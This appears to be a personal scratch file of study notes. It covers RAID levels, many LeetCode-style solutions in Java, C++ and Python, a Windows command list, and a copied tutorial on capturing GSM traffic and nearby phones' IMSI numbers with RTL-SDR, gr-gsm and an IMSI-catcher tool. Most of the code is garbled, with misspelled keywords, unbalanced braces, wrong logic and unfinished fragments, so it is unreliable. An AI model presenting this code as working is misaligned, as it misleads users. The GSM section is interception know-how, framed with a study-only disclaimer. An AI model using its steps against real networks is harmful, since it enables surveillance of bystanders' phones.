raid 1 consist of exact copy of a set of data on two or more disks; a classic RAID 1 mirrored pair contains two disks.
This configuration offers no parity , striping , or spanning of disk space across multiple disks,
since the data is mirrored on all disk belinging to the array , and the array can only be as big as the smallest member disk 
This layout is useful when read [performance or the resulting data storage capacity. The array will continue to operate so long as atleast one memeber drive is operational


RAID4
-------
radi 4 consists of block -level striping with a dedicated parity disk . As a result of its layout , RAID4 provides good performance of ranndom reads, while the performance 
of random writes is low due to the need to write all parity data to a single disk .
-------------------------------------------------------------------------
singleton java 
----------------
import java.io.*;
import java.uitl.*;
import java.text *;
import java.math.*;
import java.util.regex.*;
import java.lang.reflect.*;

class Singleton {
private static final SSingleton INSTANCE = new Singleton();
String str = "Hello This is me Afvan MJ";
private Singelton(){}
public static Singleton getSingletonInstance(){
return INSTANCE;

}

}

-------------------------------------------------------------

import java.io.Serailizable;
import java.util.function.Supplier;

public abstract class Singleton<T> implements Supplier<T>, Serializable {

private static final long serialVersiopnUID = 1;

public static<T> T getFullyConstructed(T obj){
return new FinalWrapper<>(obj).value;
}
private static final class FinalWrapper<t> {
final T value;
FinalWrapper(T value){

this.value =  value;
}
}

private transient T_obj = null;
protected abstract T getValue();
public final T get() {
T tem[ = _obj;
if(temp ! = null) {
return temp;

}

synchronized (this) {
if(_obj == null){
_obj = getFullyConstructed(getValue());

}
return _obj;

}

public void clear() {
synchronized(this) {

_obj = null
}
}
}

----------------------------------------------

Raid 4 disk system 


pseudo code 
---------------
write some data to an area of memory 
create a new file ready to be used as an image , Every byte of the file will be zero
instead of writing every byte from 0 to N we can instead move the file cursor directly to N -1 and then write 1 byte . The filesystem 
will fill in the rest of the bytes with zero for us .
write a buffer to a file for debugging process
passes all other test with different strip sizes
create disks
create raid4
reports the correct size
create buffer
overwrite raid0  with 0
reads data from the right disks and location
overwrites the correct locations
fail a disk and verify that the volume doesnt fail
test replace
fail another disk
close
-------------------------

import java.util.ArrayList;
import java.util.List;

public class BinaryTreePaths {
public class TreeNode {
int val;
TreeNode left;
TreeNode right;
TreeNOde(int x){

val = x;


}}
public List<String> binaryTreePaths(TreeNode root){
List<String> result = new ArrayList<>();
new BinaryTreePaths().inorder(root, result, "");
return result;

}

private void inorder(TreeNode, List<String> list, String path) {
if(node != null){
if(node.left == null && node.right ==null){
list.add(path + node.val);

}else{
inorder(node.left, list, path + node.val + "->");
inorder(node.right, list, path + node.val + "->");

}
}
}
}

----------------------------------------
Decode String 
--------------

public class DecodeString {

public static void main(String[] args)throws Exception{
System.out.println(new DecodeString().decodestring("100[Leetcode]"));

}

public String decodestring(String s) {
Stack<Character> stack = new Stack<>();
for (int i = 0 ; i < s.length(); i++){
if(s.charAt(i) == ']'){
StringBuilder stackBuff =  new StringBuilder();
while(stack.peek() != '['){
stackBuff.append(stack.pop());
}
stack.pop();
String num = "";
while(!stack.isEmpty() && !character.isAplhanumeris(stack.peek() && Vstack.peek() != '['){
num = stack.pop() + num;

}
String str  =stackBuff.reverse().toString();
StringBuilder stringMultiple = new StringBuilder();
int N = integer.parseInt(num);
while(N-- > 0){
stringMultiple.append(str);
}

}
}
}
}
--------------------------------------

Raid Test 
---------------
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include<unistd.h>
#include <assert.h>
#include <time.h>

void write_data(char* data, int length) {
for(int i = 0; i< length; i++){
data[i] = (char)i;

}
}

struct blkdev *create_new_image(char* path, int blocks) {
if(blocks < 1){
printf("create_new_image : error - blocks must be of least 1 :%d\n", blocks);
return NULL;
}
FILE * imaeg = fopen(path, "w");
fssek(image, blocks * BLOCK_SIZE - 1, SEEK_SET),
char c = 0;
fwrite(&c, 1, 1, image);
fclose(image;
);
return image_create(path);
)
void dump(char* buffer, int length, char* path){
FILE * output = fopen(path , "w");
fwrite(buffer, 1, length , output);
fclose(output);

}

int main(){
int unitts[] = {2,4,7,32};
int ndisks[] = {3,7,11};
char *img_names[11] = {
"test1","test2","test3","test4","test5",
        "test6","test7","test8","test9","test10","test11"
};
struct blkdev *raid0;
srand(time(NULL));
for(int i = 0, i  <4; i++){
for(int j = 0; j < 3; j++){
int units = units[i];
int ndisks = ndisks[j];
struct blkdev *ndisk[ndisk];
for(int k = 0; k  < ndisk; k++){
disk[k] = create_new_image(imag_names[k], 32);

}
raid0 = raid0_create(ndisk, disks, unit);
assert(raid0 ! = null);
int num_blocks = bllkdev_num_blocks[BLOCK_SIZE];
assert(num_blocks == blkdev_num_blocks(disk[0] / unit * unit * ndisk);

char read_buf[BLOCK_SIZE];
char write_buf[BLOCK_SIZE];
char backup[BLOCK_SIZE * num_blocks];
char copy[BLOCK_SIZE * num_blocks];
assert(blkdev_write(raid0, 0 ,num_blocks, backup) == SUCCESS);
for(int i = 0; i < num_blocks; i++){
int start = rand() % num_blocks;
assert(blkdev_write(raid0, start, 1, write_buf) == SUCCESS);
memcpy(backup + start * BLOCK_SIZE);
assert(memcmp(backup + start * BLOCK_SIZE, write_buf, BLOCK_SIZE) == 0);
assert(blkdev_read(raid0, start, 1, read_buf) == SUCCESS);
assert(memcpy(write_buf, read_buf, BLOCK_SIZE) == 0);
bzero(read_buf, BLOCK_SIZE);
}
assert(blkdev_read(raid0, 0 , num_blocks, copy) == SUCCESS);
dump(copy, BLOCK_SIZE * num_blocks, "copy");
dump(backup, BLOCK_SIZE * num_blocks, "backup");
assert(memcmp(write_buf, read_buf, BLOCK_SIZE) == 0);
image_fail(disk[0]);
assert(blkdev_write(raid, 0, 1, write) != SUCCESS);
assert(blkdev_read(raid0, 0, 1, read_buf) != SUCCESS);
blkdev_close(raid0);
printf("Raid0 test stripe size : %d, disk number : %d, passed.\n",  unit, ndisk)
;
}
}
}
}
------------------------------------------

Maximum Binary Tree-----
----------------------------

public class MaximumBinaryTree{
public static class TreeNode {
int val;
TreeNode left;
TreeNode right;
TreeNode(int x){
val = x;

}
}
private int[][] max;

public static void main(String[] args)throws Exception {
int[] nums = {3,2,1,6,0,5};
TreeNode root = new MaximumBinaryTree().constructMaximumBinaryTree(nums);
System.out.println(root.val);
}

public TreeNode constructMaximumBinaryTree(int[] nums){
max = new int[nums.length][nums.length];
for (int i = 0; i  <nums.length; i++){
max[i][i] = i;

}

for(int i = 0; i < nums.length; i++){
for(int j =i + 1; j < nums.length; j++){
max[i][j] = nums[max[i][j - 1] > nums[j] ? max[i][j-1] : j;

}
}
return build(0, nuums.length - 1, nums);
}

private TreeNode build(int s, int e , int[] nums){
if (s <= e) {
int val = nums[max[s][e]];
TreeNode n = new TreeNode(val);
n.left = build(s, max[s][e] = 1, nums);
n.right = buils(max[s][e] + 1, e, nums);
return n;
}
return null;

}
}

---------------------------------------------------------------
SDR
software defined radio is a radio broadcast communication technology , which is based on softwar- defined wireless communication protocol instead of being 
implemented through hard-wires. SDR allows easy signal processing and experimentation with more complex 
radio frequency signals 

----------------------------------------------

RTL -SDR
Realtek(RTL2832U) TV stick
allows transmission of raw I/O samples , which  can be used for DAB/DAB+ /FM demodulation 



RTL - SDR
Hackrf
USRP
Blade-RF

GR-GSM
IMSI- Catcher
GQRX
RTL-SDR Tools
Kalibrate


Installation of Wireshark

sudo apt-get update

 sudo apt-get install gnuradio gnuradio-dev git cmake autoconf libtool pkg-config g++ gcc make libc6 libc6-dev libcppunit-1.14-0 libcppunit-dev swig doxygen liblog4cpp5v5 liblog4cpp5-dev python3-scipy gr-osmosdr libosmocore libosmocore-dev rtl-sdr osmo-sdr libosmosdr-dev libboost-all-dev libgmp-dev liborc-dev libboost-regex-dev python3-docutils build-essential automake librtlsdr-dev libfftw3-dev gqrx wireshark tshark

 git clone -b maint-3.8 https://github.com/velichkov/gr-gsm.git

cd gr-gsm

mkdir build

cd build

cmake ..

make

sudo make install

sudo ldconfig

export PYTHONPATH=/usr/local/lib/python3/dist-packages/:$PYTHONPATH

Installation of Kalibrate

sudo apt-get update

git clone https://github.com/steve-m/kalibrate-rtl

cd kalibrate-rtl

./bootstrap && CXXFLAGS='-W -Wall -O3'

./configure

make

sudo make install

Installation of IMSI Catcher

sudo apt install python-numpy python-scipy python-scapy

git clone https://github.com/Oros42/IMSI-catcher.github



6.Capturing the GSM traffic
For this practical, the RTL-SDR dongle was used. Once the tools installation process is complete, plugin the RTL-SDR USB dongle to your system.

Open the terminal and run the below command to check the dongle has been plugged in successfully.

6In India Mobile GSM networks work on 900MHz and 1800MHz frequency bands (Uplink and Downlink). 

The help guide of the “grgsm scanner” tool.

  7

Search for nearby GSM base stations using “Kalibrate” or “grgsm_scanner” tools.

8Three base stations were found. The signal mentioned above was relatively strong with a frequency of 945.4MHz and 945.6MHz.

In the above manner, we obtained some parameter information of the base station, such as: center frequency, channel, ARFCN value, LAC, MCC, MNC value, etc. 

With the above details, we want to sniff the base station frequency. For that the program called “grgsm_livemon” will be used.

The help guide of the “grgsm_livemon” tool.

9Run the “Wireshark” before running the “grgsm_livemon” tool to capture the packets. Select any interface to capture all the data.

10Once the sniffing of the frequency starts, a popup window appears, as shown in the screenshot below.

11The frequency button needs to be moved in order to capture the frequency. Once data capture starts it will look like the screenshot below.

12Now we need to capture the IMSI details with the help of an “IMSI Catcher” tool.

13To capture the IMSI and other details like TMSI, Country, Brand, Operator, MCC, MNC, LAC, Cell-ID etc., run the “IMSI Catcher” tool.

14In Wireshark, the captured data of base station’s MNC, MCC, LAI and other information can be seen.

15

7.Detection of IMSI Catcher

There are different applications available, which help to find the IMSI Catcher in your location. Once it is installed in mobile, it will automatically detect the IMSI Catcher. Applications contain a database of all the cell towers of mobile carriers in different countries and regularly update this list.

Every time it detects a cell tower, it checks the list to see if it exists. If it exists, then it is a legitimate one, and there is no danger. However, if the tower is not on the list, there is something suspicious going on – and there is a high probability that this is an IMSI Catcher.

In this case, the best you can do is to turn off your phone and turn it on again, once you reach a safe location.

Below are some of the IMSI Catcher detector applications:
Osmocom – used to detect and fingerprint certain network characteristics
Android IMSI-Catcher Detector
SnoopSnitch
Cell Spy Catcher
GSM Spy Finder
Notes: This article is only for study purposes and should not be used for illegal activities. It only discusses the interception of GSM data and not cracking. Illegal wiretapping is a serious breach of the law in most countries.


----------------------------------------------------------------------------
COBIT5
ISO/IEC 20000 - ISO 20000
eTOM - eTOM
Microsoft Opertaions Framework
Knowledge Centered Service 
----------------------------------------------------
Reach target with minimum moves and Rotations

------------BFS------------------------------

we want shortest path So BFS is our option 
-------------------------------------------

class Solution {
public : 
int minimumMoves(Vector<vector<int>>&G){
queue<int> q;
q.push(0);
unordered_set<int> seen;
seen.insert(0);
itn step = 0, N = G.size();
auto safe = [&](int p){
int y = p % 1000, x = p / 1000 % 1000, dir = p / 1000000;
if(x < 0 || y < 0 || x >= N || y >= N || G[x][y] == 1)return false;
return (dir == 0 && y + 1 < N && G[x][y - 1] == 0)
|| (dir == 1 && x  + 1 < N && G[x + 1][y] == 0);

};
while(qsize()){
int cnt = q.size();
while(cnt--){
int p = q.front(), y = p % 1000, x = p / 1000 % 1000, dir = p / 1000000;
if(x == N - 1 && y == N - 2)return step;
q.pop();
int r = p + 1;
if(seem.count(r) == 0  && safe(r)){

seen.insert(r);
q.push(r);
}
int d = p + 1000 ;
if(seen.sount(d) == 0 && safe(d)){
seen.insert(d);
q.push(d);
}


}

}
}
}

--------------------------------------------------------

Boats to save people 
-----------------------

public class Boats{
public static void main(String[] args){
int[] A = {3, 5, 3, 4};
System.out.println(new Boats().numboats(A, 8));

}
public int numboats(int[] people, int limit){
TreeMap<Integer, Integer> treeMap = new TreeMap<>();
int boats = 0;
for(int p : people){
treeMap.putIfAbsent(p, 0);
treeMap.put(p, treeMap.get(p) + 1);

}

Arrays.sort(people);
for(int p : people){
if(treeMap.containsKey(p)){
int count  = treeMap.remove(p);
--count;
if(count != 0){
treeMap.put(p, count);
}
int balance = limit - p;
Map.Entry<Integer, Integer>floor  = treeMap.floorEntry(balance);
if(floor != null){
int c = floor.getValue();
--c;
treeMap.remove(floor.getKey());

}
}

}
}
}

----------------------------------------------

ASSOC modifies file extension 
ATTRIB change files attributes
BREAK Sets or clears 
BCDEDIT Sets properties in boot database to control boot loading 
CACLS Displays or modifies access control Lists 
CALL Calls one batch program 
CD
CHCP display or sets the active code page number
CHDIR displays the name of our changes 
CHKDSK checks a disk and displays a status reports
CHKNTFS Displays or modifies the checking of disk at boot time 
CLS
CMD
COLOR
COMP
COMPACT display or alters the compression of Files onNTFS partitions
CONVERT  converts FAT Volumes to NTFS 
COPY copies one or more files 
DATE 
DEL
DIR
DISKPART
DOSKEY edit command lines , recalls Windows Commands, and create macros
DRIVERQUERY displays a current device driver status and properties
ECHO
ENDLOCAL End localization environment in a batch file 
ERASE
EXIT
FC compare two files
Find
FINDSTR
FORMAT
FSUTIL displays or configures the file system properties
FSTYPE displays or modifies file types
GOTO Detects the Windows command interpreter to a labeled line in a batch program
GPRESULT display group policy 
GRAFTABLE enables windows to display an extended character set in graphics mode 
HELP
ICACLS display, modify, backup, or restore ACLS for files and directories
If
LABEL
MD
MKDIR
MKLINK
MODE
MORE 
MOVE 
OPENFILES displays files opened by remote users
PATH 
PAUSE
POPD restore the previous values of the cwd saved by PUSHD
PRINT
PROMPT
PUSHD
RD
RECOVER
REM records comments in batch files
REN  renames a file 
RENAME
RMDIR
ROBOCOPY Advanced utility to copy files and directory tree
SET
SETLOCAL
SC Displays  or configures services
SCHTASKS
SHIFT shift the position of replaceable parameters in batch files
SHUTDOWN Allows proper local or remote shutdown of machine
SORT
START
SUBST assoc a path with a drive letter
SYSTEMINFO
TASKLISY
TASKKILL
Time
TITLE
Tree
TYPE
VER
VERIFY
VOL
XCOPY
WMIC
------------------------------------------------------------
Skyline Problem
-----------------

bool cmp(vector<int> &a, vector<int>&b){
return a[0] < b[0];

}

class Solution{
public : vector<pair<int, int>> getSkyline(vector<vector<int>> & buildings){
vector<pair<int, int >> ans;
sort(buildings.begin(), buildings.end(), cmp);
int i =0 , x = 0, y = 0, N = buildings.size();
priority_queue<pair<int, int>> live;
while(i < N || !live.empty()){
if(i < N && (live.empty() || live.top().second >= buildings[i][0])){
x= buildings[i][0];
while(i < N && buildings[i][0] == x){
live.push(make_pair(buildings[i][2],buildings[i][1]));
++i;

}

}else{
x = live.top().second;
while(!live.empty() && live.top().second <= x) live.pop();
}
y = live.empty() ? 0 : live.top().first;
if(ans.empty() || ans.back().second != y ) ans.push_back(make_pair(x,y));

}
return ans;


}
};

---------------------------------------------------
Stiffness.ino 
----------------

sysms mF0 B wac
h=10*10^(-3)%m
r=32*10^(-3)%m
p = 1.189
c = 346.13
A = 3.145 * r ^2
V = A*h
k=p*c*A^2/VER
w0 = sqrt(k)
x = (F0/m)/(sqrt(w^@-w)^2)^2+2*B*w)^2));
x=simplify(x,1)
x=x*m
x=x/F0
x=subs(s,B,0,8)
f=0:0.5:1000
x=subs(x,w,f)
plot(f,x)
------------------------------------------------------------
python Adi Shamir 
------------------
from _future_ import division
from _future_ import print_function
import random
import functools

_PRIME = 2 **  127 - 1
#13 mersenne Prime 
--------------------

_RINT = functools.partial(random.SystemRandom().randint(), 0)

def _eval_at(poly, x, prime):
accum = 0
for coeff in reversed(poly):
accum *= x*
accum += coeff
accum %= prime
return accum

def make_random_shares(minimum, shares, prime=_PRIME):
if minimum > shares:
raise ValueError("Pool secret would be irrecoverable.")
poly = [_RINT(prime - 1) for i in range(minmum)]
points = [(i, _eval_at(poly, i, prime))
for i in range(1, shares + 1)]
return poly[0], points

def _extended_gcd(a,b);
x = 0
last_x = 1
y = 1
last_y = 0
while b != 0 
quot = a // b
a,b = b, a % b
x, last_x = last_x - quot * x,x
y, last_y = last_y - quot * y,yak
return last_x, last_y

def divmod(num, den p):
inv,_ = extended_gcd(den, p)
return num * inv

def langrage_interpolate(x, x_s, y_s, p):
k = len(x_s)
assert k == len(set(x_S)) "points must be distinct"
def PI(vals):
accum = 1
for v in vals :
accum *= v
return accum
num= []
den= []
for i in range(k):
others = list(x_s)
cur = others.pop(i)
nums.append(PI(x - o for o in others))
dens.append(PI(cur - o for o in others))
den = PI(dens)
num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p) for i in range((k)])
return (_divmod(num, den, p) + p) %  p 

def recover_secret(shares, prime = _PRIME);
if len(shares) < 2 :
raise ValueError("need at least two shades"
x_s, y_s  = zip(*shares))
return _langrange_interpolate(0, x_s, y_s, prime)

def main():
secret, shares = make_random_shares(minimum = 3, shares = 6)




------------------------------------------------------------------------------

Data on Intervals Edge 
------------------------

class Solution {
public :
int findLatestStep(vector<int>& A, int m){
int N = A.size(), ans = -1;
if (N == M)  return N;
vector<int> len(N + 2);
for(int i = 0; i < N; ++i){
int n = A[i], left = len[n - 1], right = len[n + 1];
len[n - left] = len[n + right] = left + right + 1;
if(left == m || right == m) ans = i;

}
return ans;

}
};





-------------------------------------------------------------
Union find 
--------------

class Solution {
vector<int> id, size;
int cnt = 0;
int find(int x){
return id[x] == x ? x : (id[x] = find(id[x]));

}

void connect(int x, int y, int m){
int p = find(x), q = find(y);
if (size[q] == m) --cnt;
size[p] += size[q];
id[q] = p;

}
public : 
int findLatestStep(vector<int>& A, int m)

{
int N  = A.size(), ans = -1;
id.assign(N, 0 );
size.assign(N, 0);
itoa(begin(id), end(id), 0);
for(int i = 0; i < N; ++i){
int n = A[i] - 1;
size[n] = 1;
if(n - 1 > = 0 && size[n - 1]) connect(n, n-1, m);
if(n + 1 < N && size[n + 1]) connect(n, n+1 , m);
if (size[n] == m) ++cnt;
if(cnt) ans  = i + 1;

}
return ans;
}
};
---------------------------------------------------------------------------------

package Array;

import java.util.Arrays;

public class MeetingsRooom {
public static class Interval {
int start;;
 int end;
 
 Interval() {
 start = 0;
 end = 0;
 
 }
 
 Interval(int s, int e){
 start = s;
 end = e;
 
 }
}

public static void main(String[] args) throws Exception {
Interval i1 =  new Interval(0,30);
Interval i2 = new Interval(5, 10);
Interval i3 = new Interval(15, 20);;
Interval[] intervals = {i1, i2, i3};
System.out.println(new MeetingsRooom().canAttendMeetings(intervals));

}
public boolean canAttendMeetings(Interval[] intervals){
Arrays.sort(intervals, (a,b) -> Integer.compare(a.start, b,start));
for(int i = 1; i < intervals.length; i++){
if(intervals[i].start < intervals[i - 1].end) return false;

}
return true;

}
}

---------------------------------------------------------------------------
Sliding Puzzle
----------------
import java.util.*;
public class SlidingPuzzle{
public static void main(String[] args){
int[][] board = {{1,2,3},{4,0,5}};
System.out.println(new SlidingPuzzle.slidingPuzzle(board));

}

class Node {
Node(Board b){
this.b = b;

}
Board b;
int dist;

private static final int[] R = {-1, 0, 0, 1};
private static final int[] C = {0,-1,-1,0 };
private static final String result ="123450";


class Board{
int[][] board;
int r, c;
final String state;

Board(int[][] board){
this.board = board;
StringBuilder sb = new StringBuilder();
for(int i = 0 ; i < 2; i++){
for(int j = 0; j < 3; j++){
sb.append(board[i][j]);

}
}
state = sb.toString();
}

public boolean equals(Object o){
if(this == o) return true;
if(!(o instanceof Board)) return false;
Board board = (Board) o;
return Objects.equals(state, board.state);

}

public innt hashCode(){
return Object.hash(state);

}
}

private Set<Board> done;


public int slidingPuzzle(int[][] board){

done = new HashSet<>();
Board b = new Board(board);
for(int i = 0 ; i < board.length; i++){
for(int j = 0; j < board[0].length; j++){
if(board[i][j] == 0){
b.r = i;
b.c = j;
break;
}
}
}
if (b.state.equals(result)) return 0;
Queue<Node> queue = new ArrayDeque<>();
queue.offer(new Node(b));
while(!queue.isEmpty()){
Node child = queue.poll();
Board br = child.b;
done.add(br);
for(int i = 0; i < 4; i++){
int newR = br.r  + R[i];
int newC = br.c + C[i];
if(newR < 0 || newR >= 2 || newC < 0 || newC >= 3) continue;
int num = br.board[newR][newC];
int[][] tempB = clone(br.board);
tempB[newR][newC] = 0;
tempb[br.r][br.c] = num;
Board tempBoard = new Board(tempB);
tempBoard.r = newR;
tempBoard.c = newC;
if(!done.contains(tempBoard)){
if(tempBoard.state.equals(result)){
return child.dist  + 1;

}
Node new Child = new Node(tempBoard);
neewChild.dist = child.dist + 1;
queue.offer(newChild);

}
}
}

return -1;


}

private int[][] clone(int[][] original){
int[][] cloned  = new int[2][3];
for(int i = 0; i < 2; i++){
for(int j =0 ; j < 3; j++){

cloned[i][j] = original[i][j];
}
}
return cloned;
}
}


-----------------------------------------------------------------------------

Partition Equal Subset Sum

class Solution{
public:

bool dp[201][2001];
bool equalPart(vector<int>&arr, int size, int sum){
for(int  i = 0; i<)
}
}
--------------------------------------------------NOT COMPLETE---------------

import java.util.*;

public class FreqStack {
public static void main(String[] args){
FreqStack freqStack = new FreqStack();
freqStack.push(5);
freqStack.push(5);
freqStack.push(5);
freqStack.push(5);
freqStack.push(5);
System.out.println(freqStack.pop());
freqStack.push(7);
System.out.println(freqStack.pop());
System.out.println(freqStack.pop());
freqStack.push(1);
freqStack.push(2);
System.out.println(freqStack.pop());
System.out.println(freqStack.pop());
System.out.println(freqStack.pop());
System.out.println(freqStack.pop());
System.out.println(freqStack.pop());



}

class Node {
itn val, pos;
Node(int val, int pushCount){
this.val = val;
this.pos = pushCount;

}


}

class FreqNode {
itn freq;
Stack<Node> stack;

FreqNode(int freq, Stack<Node> stack) {
this.freq = freq;
this.stack = stack;
}
public int getFreq() {
return freq;

}

public int getTop() {
return  !stack.isEmpty() ? stack.peek().pos : -1;

}

public void push(Node e){
freq++;
stack.push(e);

}

public Node pop(){
freq--;
return stack.pop();

}
}

private PriorityQueue<FreqNode> priorityQueue;
private Map<Integer, FreqNode> map;
private int pushCount;

public FreqStack(){
priorityQueue = new PriorityQueue<>(

(o1, o2) -> {

if (o1.freq == o2.freq){
return Interger.compare(o2.getTop(), o1.getTop());

}else{
return Integer.compare(o2.freq, o1,freq);

}});
map = new HashMap<>();
pushCount = 0;
}

public void push(int x)
{

pushCount++;
Node node = new Node(x, pushCount);
FreqNode freqNode;
if (map.containsKey(x)){
freqNode = map.get(x);
priorityQueue.remove(freqNode);
freqNOde.push(node);


}else{
Stack<Node> stack = new Stack<>();
stack.push(node);
freqNode = new FreqNode(1, stack);
map.put(x, freqNode);

}
priorityQueue.offer(freqNode);

}

public int pop() {
FreqNode freqNode = priorityQueue.poll();
Node topNode = freqNode.pop();
if(freqNode.freq == 0){
map.remove(topNode.val);

}else{
priorityQueue.offer(freqNode);

}
return topNode.val;


}
}
}

-------------------------------------------------------------------------------
Pascals triangle
-------------------------------------------
public class Pascalstriangle{
public static void main(String[] args){
System.out.println(new Pascalstriangle().getRow(3));

}

public List<Integer> getRow(int rowIndex){
int k = rowIndex;
if (k == 0) return Arrays.asList(1);
else if(k == 1) return Arrays.asList(1,1);
else if(k == 2) return Arrays.asList(1,2,1);
List<Integer> result = new ArrayList<>();
result.add(2);
k = k - 2;
int p,c;
 while (k--  > 0){
 p = 1;
  int i = 0;
  for(int l = result.size(); i < l; i++){
  c = result.get(i);
  result.set(i, p + c);
	p=c;
	
  }
	result.add(p + 1);
	
 }
result.add(0,1);
result.add(1);
result result;

}
}
-------------------------------------------------------------------------------


--------------------------------------------------------------------------
B +  tree
----------------------

#include<bits/stdc++.h>
#define vi vector<int>
#define vp vector<node*>
#define pb(x) push_back(x)
#define ppp() pop_back()
#define MAXN 4
#define LIM 100005

using namespace std;

void instr(){

cout<<"Output necessary " <<endl;

}

struct node{
int sz = 0, szp = 0;
int val[MAXN+3];
node* ptr[MAXN+3];
node* par;
node* sibling;
int parPtrID;
bool isLeaf;

node* create(){
node* cur = (node*)malloc(sizeof(node));
cur->sz = 0; cur->szp = 0;
cur-isLeaf = true;
cur->par = NULL;
cur->subling = NULL;
cur->parPtrID = -1;
cout << "New tree created" << endl;
return cur;
}

void insertVal(int n , int x){
for(int i = sz - 1,i>= in; i--)
val[i+1] = val[i];
val[in] = x;
sz++;
}

void insertPtr(int n, node* p){
for(int i=szp - 1; i>= in; i--){
ptr[i]->partPtrID++;
ptr[i + 1] = ptr[i];
ptr[i]->parPtrID++;
}
ptr[in] = p;
szp++;

}

void pushBackVal(int x){
val[sz++] = x;

}
void pushBackPtr(node* p){
ptr[szp++] = p;

}

void eraseVal(int in){
for(int i= in  +1; i <szp; i++)
val[i - 1] = val[i];
sz--;

}
void erasePtr(int in){
for(int i = in+1; i< szp;i++)
ptr[i - 1] = ptr[i];
szp--;

}

void reverseVal(){
reverse(val, val+sz);

}
void reversePtr(){
reverse(ptr, ptr+szp);

}

void insert(int x){
int iny =0 ;
while(iny < sz){
if(x < val[iny]) break;
iny++;
}
if(isLeaf) insertVal(iny, x);
else{
cout<<"INS"<<iny<<endl;
ptr[iny]->insert(x);

}
if(sz == MAXN) split();
}

void split(){
node* splitedNode = create();
splitedNode->isLeaf = isLeaf;
sibling = splitedNode;

while(sz > MAXN/2){
splitedNode->pushBackVal(Val[sz - 1]);
sz--;

}

}

};
-----------------------------------------------------------------------

Basic to understand 
---------------------

#include<stdio.h>
#include<conio.h>
#include<iostream>
using namespace std;
struct B+treeNode{
int *data;
B+TreeNode **child_ptr;
bool leaf;
int n;

}*root = NULL, *np = NULL, *x = NULL;
B+TreeNode * init()
{
int i;
 np = new B+TreeNode;
 np->data = new int[5];
 np->child_ptr = new B+TreeNode *[6];
 np->leaf = true;
 np->n = 0;
 for(i = 0; i < 6; i++){
 np->child_ptr[i] = NULL;
 
 }
 return np;
 
}
void traverse(B+TreeNode * P){
cout<<endl;
int i;
for(i = 0; i < p->n; i++){
if(p -> leaf ==false){
traverse(p->child_ptr[i]);

}
cout<< " " << p->data[i];
 
}
if(p -> leaf == false){
traverse(p->child_ptr[i])

}
cout<<endl;

}
void sort(int *p, int n){
int i , j, temp;
for(i = 0; i <n; i++ ){
for(j = i; j <= n; j++){
if(p[i] > p[j]){
temp = p[i];
p[i] = p[j];
p[j] = temp;
}
}
}
}
int split_child(B+TreenNode *x, int i){
int j, mid;
B+TreeNode *np1, *np2, *y;
np3 = init();
np3->leaf = true;
if(i == -1){
mid = x->data
}
}
------------------------------------------------------------------------
public class RandomPickIndex {
private int[] nums;

public static void main(String[] args) throws Exception {
int[] A = {1,2,3,3,3};
System.out.println(new RandomPickIndex(A).pick(1));

}

public RandomPickIndex(int[] nums){
this.nums = nums;

}
public int pick(int target){
int count = 0;
for(int num: nums ){
if(num == target){
count++;
}
}
Random ranodm = new Random();
int nPick = 1 + random.nextInt(count);
count = 0;
for(int i = 0; i < nums.length; i++){
if(nums[i] = target){
if(++count == nPick){
return 1;

}
}
}
return 0;

}

}
----------------------------------------------------------------------------
convert sortedArray to BST
-----------------------------


public class ConvertSortedArrayToBST {
public class TreeNode{
int val;
TreeNode left;
TreeNode right;

TreeNodde(int x){
val = x;

}
}

public TreeNOde sortedArrayToBST(int[] nums){
if(nums.length == 0)return null;
return build(0, nums.length - 1, nums);
}

private TreeNode build(int s, int e, int[] nums){
if(s > e) return null;
int m = (e - s) / 2;
int node = nums[s + m];
TreeNode root = new TreeNode(node);
if(s == e) return root;
root.left = build(s, s + m -1, nums);
root.right = build(s + m + 1,e, nums);
return root;

}
}

-----------------------------------------------------------------

public class FindMissingPositive {
private int L;
public static void main(String[] args) throws Exceptiono
{
int[] nums = {1,3,5,9};
System.out.println(new FirstMissingPositive(),firstMissingPositive(nums));

}


public int firstMissingPositive(int[] nums){

L = nums.length;
for(int i = 0; i < L; i++){
if(nums[i] > 0 && nums[i] <= L && nums[i] != i + 1 ){
int v = nums[i];
nums[i] = -1;
replace(v,  nums);

}
}

for(int i = 0; i < L ; i++){
if(nums[i] != i  +1)return i  +1;

}
return L + 1;


}

private void replace(int i, int [] nums){
if(i > 0 && i <= L && i != nums[i - 1]){
int v = nums[i - 1];
nums[i - 1] = i;
replace(v,nums);

		}
	}
}

---------------------------------------------------------------------------------

Base Integer-
----------------
class Solution {
public :
int bitwiseComplement(int N){
if (!N) return 1;
unsigned mask = ~0;
while(mask & N) mask <<= 1;
return ~N & ~mask;

}
};

------------------------------------
Capacity to ship Packages within D Days 
----------------------------------------

class Solution{

private:
bool ok(vector<int>&weights, int D, int capacity){
int d =  1, c = 0;
for(int w  :weights){
if(c + w > capacity){
c = 0;
++d;
if(d > D) return false;

}
c+= w;


}
return true;
}
public:
int shipWithinDays(vector<int>& weights, int D){
int sum = , maxval = 0;
for(int w :weights){
sum+= w;
maxVal = max(maxVal,w)

}
int capacity = max ((sum  +D - 1) / D, maxVal);
while(!ok(weights, D, capacity))capacity++;
return capacity;

}

}
};
------------------------------------------------------------------------------------
Binary Tree ZigZag Level Order Traversal
-----------------------------------------
class Solution{
public:
	vector<vector<int>> zigzagLevelOrder(TreeNode* root){
	if(!root) return  {};
	queue<TreeNode*> q;
	q.push(root);
	bool l2r = true;
	vector<vector<int>> ans;
	while(q.size()){
	int cnt = q.size();
	vector<int> lv;
	while(cnt --){
	root = q.front();
	q.pop();
	lv.push_back(root->val);
	if(root->left) q.push(root->left);
	if(root->right) q.push(root->right);
	
	if(!l2r) reverse(begin(lv), end(lv));
	ans/push_back(lv);
	l2r = !l2r;
	
	
	
	}
	return ans;
	
	
	}
	};

-----------------------------------------------------------------------------------------------
Valid Boomerang 
-------------------
class Solution {

public : 
bool isBoomerang(vector<vector<int>>& points){
return (points[0][1]- points[1][1]) * (points[0][0] - points[2][0]) != (points[0][1] - points[2][1]) * (points[0][0] - points[1][0]);

}
}

-----------------------------------------------------------------------------------------------
Distant barcodes -
----------------------

class Solution {
public :
vector<int> rearrangeBarcodes(vectpr<int>& A){
unordered_map<int, int> cnt;
for(int n : A )cnt[n]++;
auto cmp = [&](int a, int b) {return cnt[a] < cnt[b];};
priority_queue<int, vector<int>, decltype(cmp)> q(cmp);
for(auto &p : cnt) q.push(p.first);
int prev = 0;
vector<int> ans;
while(q.size()){
int n = q.top();
q.pop();
ans.push_back(n);
if(prev) q.push(prev);
if(--cnt[n]) prev = n;
else prev = 0;

}
